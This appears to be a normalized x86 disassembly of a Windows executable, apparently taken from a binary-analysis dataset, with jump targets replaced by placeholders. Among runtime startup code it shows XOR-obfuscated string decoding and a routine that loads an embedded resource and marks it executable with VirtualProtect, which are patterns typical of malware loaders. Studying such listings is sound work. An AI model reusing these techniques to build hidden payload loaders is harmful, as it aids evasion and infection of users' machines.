xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_410985
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_4040e1
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_40d215
mov edi [ DecodePointer@IAT ]
push sub_41002d
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40a4e5
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40afb0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_411115
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_411148
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40f156
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40f156
pop ecx
sub_411250
push ebp
mov ebp esp
push 0xffffffff
push sub_4160d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x18 ] esi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x15 ] 0x0
mov eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea edi [ ebx + 0xc ]
call sub_401580
mov ecx [ ebp + 0xc ]
mov edi eax
mov eax [ ebp - 0x14 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x14 ]
mov [ edi + 0x14 ] dl
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx ]
push edi
push ecx
mov ecx esi
call sub_411250
mov [ edi ] eax
mov edx [ ebx + 0x8 ]
push edi
push edx
mov ecx esi
call sub_411250
mov [ edi + 0x8 ] eax
mov [ ebp - 0x14 ] edi
sub_411330
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
push edi
mov edi [ rw-data ]
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x44
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x18 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x75
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x42
and edx 0xff
mov [ ebp + eax * 2 - 0xa0 ] dx
inc eax
cmp eax 0x1e
jb r-xdata
lea ecx [ ebp - 0xa0 ]
xor eax eax
push ecx
lea ecx [ edi + 0xda0 ]
mov edx edi
mov [ ebp - 0x64 ] ax
call sub_404610
test eax eax
jne r-xdata
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
mov edx [ edi + 0xda0 ]
cmp edx [ edi + 0xda4 ]
je r-xdata
mov ecx [ r--data ]
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
lea ecx [ ebp - 0x60 ]
xor eax eax
push ecx
lea ecx [ edi + 0xdb0 ]
mov edx edi
mov [ ebp - 0x26 ] ax
call sub_404610
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov edx esi
lea ecx [ ebp - 0x14 ]
call sub_40f420
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
mov esi [ edi + 0xdb0 ]
cmp esi [ edi + 0xdb4 ]
je r-xdata
mov edx [ edi + 0xdb0 ]
cmp edx [ edi + 0xdb4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ edi + 0xdc0 ] 0x1
pop edi
xor ecx ebp
pop esi
call sub_401400
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x24 ]
push eax
mov edx esi
lea ecx [ ebp - 0x14 ]
call sub_40f420
add esi 0x1c
cmp esi [ edi + 0xdb4 ]
jne r-xdata
sub_4114b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x31 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_40a7b0
mov ecx [ ebx ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
push r--data
call sub_40eab5
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x31 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x31 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x30 ]
mov cl [ eax + 0x30 ]
mov [ eax + 0x30 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x30 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x30 ] bl
jne r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x31 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x20 ] 0x10
pop edi
pop esi
pop ebx
jb r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax edi
call sub_404050
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0xf
mov [ eax + 0x1c ] 0x0
push eax
mov [ eax + 0xc ] 0x0
call sub_408b16
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ eax + 0xc ]
push edx
call sub_408b16
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ edi + 0x30 ] bl
cmp [ edi + 0x30 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov [ ecx + 0x30 ] bl
push edx
mov ecx esi
mov [ esi + 0x30 ] 0x0
call sub_40c9a0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov [ ecx + 0x30 ] bl
push edx
mov ecx esi
mov [ esi + 0x30 ] 0x0
call sub_401c40
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] bl
je r-xdata
mov al [ esi + 0x30 ]
mov [ ecx + 0x30 ] al
mov [ esi + 0x30 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x30 ] bl
push edx
mov ecx esi
call sub_40c9a0
mov eax [ ecx + 0x8 ]
mov [ eax + 0x30 ] bl
push edx
mov [ ecx + 0x30 ] 0x0
call sub_401c40
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
mov al [ esi + 0x30 ]
mov [ ecx + 0x30 ] al
mov [ esi + 0x30 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x30 ] bl
push edx
mov ecx esi
call sub_401c40
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x30 ] bl
push edx
mov [ ecx + 0x30 ] 0x0
call sub_40c9a0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_411750
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_411785
mov edi edi
push ebp
mov ebp esp
call sub_40c968
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_4117ac
push 0xc
push r--data
call sub_413ff0
push 0xe
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411813
call sub_414035
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40ab76
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_40ab76
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_41181c
mov edi edi
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
movzx eax [ esi ]
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax 0x3d
je r-xdata
push ebx
push 0x4
inc edi
push edi
call sub_40a4e5
mov ebx eax
pop ecx
pop ecx
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_40249b
pop ecx
lea esi [ esi + eax * 2 + 0x2 ]
inc edi
mov esi [ rw-data ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
pop ebx
push esi
call sub_40249b
cmp [ esi ] 0x3d
pop ecx
lea edi [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_40ab76
and [ rw-data ] 0x0
and [ ebx ] 0x0
mov [ rw-data ] 0x1
xor eax eax
lea esi [ esi + edi * 2 ]
push 0x2
push edi
call sub_40a4e5
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_40ab76
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push eax
call sub_413100
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402acd
int3
add ebx 0x4
sub_4118f8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40d42e
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_402116
pop ecx
push eax
call sub_4038af
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_402116
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_402116
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_402116
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_402116
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_411a1a
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_411a50
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov [ edi ] ecx
mov eax edi
mov esp ebp
pop ebp
retn 0x8
jmp r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_405770
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov edx [ ecx ]
mov [ edi ] edx
mov eax edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x31 ] 0x0
mov edx ecx
jne r-xdata
push edx
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_4114b0
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
sub_411b20
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
mov [ esi ] r--data
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0xa
push eax
push edi
call [ FindResourceW@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
push eax
call [ GetModuleHandleW@IAT ]
mov edi eax
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
push eax
push edi
call [ LoadResource@IAT ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
push edi
mov [ esi + 0x10 ] eax
call [ SizeofResource@IAT ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
test ecx ecx
je r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x40
push eax
push ecx
call [ VirtualProtect@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_411bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_41643d
mov eax [ fs : 0x0 ]
push eax
sub esp 0xdd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xd3c ] eax
mov ebx ecx
mov [ ebp - 0xd54 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xd38 ] edi
mov [ ebp - 0xd34 ] edi
mov [ ebp - 0xd30 ] edi
mov [ ebp - 0xd50 ] edi
mov [ ebp - 0x4 ] 0x4
push 0xc
mov [ ebp - 0xdbc ] edi
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd9c ] esi
mov [ ebp - 0x4 ] 0x5
cmp esi edi
je r-xdata
xor esi esi
push ebx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
cmp eax edi
jne r-xdata
mov ecx [ ebp - 0xd3c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0xd54 ]
mov [ ecx ] edi
cmp eax edi
je r-xdata
push 0x8007000e
call sub_40b3f0
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0xd64 ] esi
mov [ ebp - 0xd9c ] esi
cmp esi edi
jne r-xdata
cmp ebx edi
je r-xdata
lea ecx [ ebp - 0xd54 ]
push ecx
push r--data
push 0x1
push edi
push r--data
mov [ ebp - 0xd54 ] edi
call [ CoCreateInstance@IAT ]
cmp eax edi
jl r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
push 0x8007000e
call sub_40b3f0
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xd54 ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0xd50 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx + 0x104 ]
lea ecx [ ebp - 0xdbc ]
push ecx
mov ecx [ esi ]
push ecx
push eax
call edx
test eax eax
jne r-xdata
push 0x80004003
call sub_40b3f0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0xd30 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
mov edi [ ebp - 0xd54 ]
test edi edi
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0xd34 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
mov eax [ ebp - 0xd50 ]
test eax eax
je r-xdata
push 0x80004003
call sub_40b3f0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0xd38 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea ecx [ ebp - 0xd50 ]
mov [ ebp - 0xd50 ] 0x0
mov eax [ edi ]
mov edx [ eax + 0xb4 ]
push ecx
push edi
call edx
test eax eax
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xd54 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea edx [ ebp - 0xbc ]
mov eax 0x17
call sub_40c700
lea edx [ ebp - 0x30 ]
mov eax 0x9
call sub_40c700
mov esi [ ebp - 0xd50 ]
test esi esi
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea eax [ ebp - 0xd44 ]
push eax
lea edi [ ebp - 0xbc ]
call sub_401ed0
mov edi eax
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0xd30 ]
test eax eax
je r-xdata
push 0x80004003
call sub_40b3f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0xd30 ] 0x0
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov eax [ eax ]
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x11
call sub_40c700
lea edx [ ebp - 0xdc ]
mov eax 0x1c
call sub_40c700
lea edx [ ebp - 0x40 ]
mov eax 0xe
call sub_40c700
lea edx [ ebp - 0x60 ]
mov eax 0x10
call sub_40c700
lea edx [ ebp - 0x50 ]
mov eax 0x15
call sub_40c700
lea edx [ ebp - 0x20 ]
mov eax 0x1b
call sub_40c700
lea edx [ ebp - 0x74 ]
mov eax 0x24
call sub_40c700
lea edx [ ebp - 0x88 ]
mov eax 0x1
call sub_40c700
mov esi [ ebp - 0xd50 ]
test esi esi
jne r-xdata
mov esi [ ebp - 0xd30 ]
xor edi edi
cmp esi edi
jne r-xdata
mov ecx [ esi ]
lea edx [ ebp - 0xd30 ]
push edx
push eax
mov eax [ ecx + 0xc8 ]
push esi
call eax
test eax eax
lea edi [ ebp - 0xd44 ]
sete bl
mov [ ebp - 0x4 ] 0x6
call sub_404430
test bl bl
je r-xdata
lea eax [ ebp - 0xd44 ]
push eax
lea edi [ ebp - 0xa0 ]
call sub_401ed0
mov edi eax
mov [ ebp - 0x4 ] 0xd
mov eax [ ebp - 0xd30 ]
test eax eax
je r-xdata
push 0x80004003
call sub_40b3f0
mov eax [ ebp - 0xd34 ]
cmp eax edi
je r-xdata
push 0x80004003
call sub_40b3f0
mov [ ebp - 0xd30 ] 0x0
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea ecx [ ebp - 0xd34 ]
mov [ ebp - 0xd34 ] edi
mov eax [ esi ]
mov edx [ eax + 0x24 ]
push ecx
push esi
call edx
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov [ ebp - 0xd2c ] edi
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0xd34 ]
cmp eax edi
jne r-xdata
lea edi [ ebp - 0xd9c ]
call sub_404430
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0xd50 ]
test eax eax
je r-xdata
mov esi [ ebp - 0xd30 ]
test esi esi
je r-xdata
mov ecx [ esi ]
lea edx [ ebp - 0xd30 ]
push edx
push eax
mov eax [ ecx + 0xc8 ]
push esi
call eax
test eax eax
lea edi [ ebp - 0xd44 ]
sete bl
mov [ ebp - 0x4 ] 0x6
call sub_404430
test bl bl
je r-xdata
lea edx [ ebp - 0xd2c ]
mov [ ebp - 0xd2c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp eax edi
jne r-xdata
push 0x80004003
call sub_40b3f0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0xd30 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push 0x80004003
call sub_40b3f0
mov eax [ ebp - 0xd34 ]
xor edi edi
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0xd2c ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd2c ]
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0xd34 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0xd64 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea ecx [ ebp - 0xd34 ]
mov [ ebp - 0xd34 ] edi
mov eax [ esi ]
mov edx [ eax + 0x24 ]
push ecx
push esi
call edx
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edi [ eax ]
lea esi [ ebp - 0xd38 ]
mov ebx eax
call sub_40eaf0
mov ecx [ edi + 0x38 ]
push eax
push ebx
call ecx
test eax eax
jne r-xdata
push 0x80004003
call sub_40b3f0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0xd38 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xd5c ] edi
mov [ ebp - 0x4 ] 0xe
mov eax [ ebp - 0xd34 ]
cmp eax edi
je r-xdata
mov [ ebp - 0xd48 ] eax
mov [ ebp - 0x4 ] 0x9
mov eax [ ebp - 0xd38 ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xd54 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea edx [ ebp - 0xd5c ]
mov [ ebp - 0xd5c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp eax edi
jne r-xdata
mov edi [ eax ]
